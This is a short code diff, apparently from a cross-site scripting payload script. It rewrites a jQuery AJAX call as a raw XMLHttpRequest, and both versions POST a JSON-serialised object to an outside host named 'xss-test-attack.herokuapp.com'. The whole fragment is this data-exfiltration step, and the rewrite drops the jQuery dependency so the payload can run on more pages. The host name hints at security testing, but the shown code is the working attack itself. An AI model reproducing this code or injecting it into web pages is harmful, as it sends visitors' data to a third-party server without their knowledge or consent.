@@ -7,11 +7,7 @@ var object = {
 
 };
 
-$.ajax({
-    url: "https://xss-test-attack.herokuapp.com/",
-    type: 'POST',
-    crossDomain: true,
-    dataType: 'html',
-    contentType: 'application/json',
-    data: JSON.stringify(object)
-});
+var xmlhttp = new XMLHttpRequest();
+xmlhttp.open("POST", "https://xss-test-attack.herokuapp.com");
+xmlhttp.setRequestHeader("Content-Type", "application/json");
+xmlhttp.send(JSON.stringify(object));
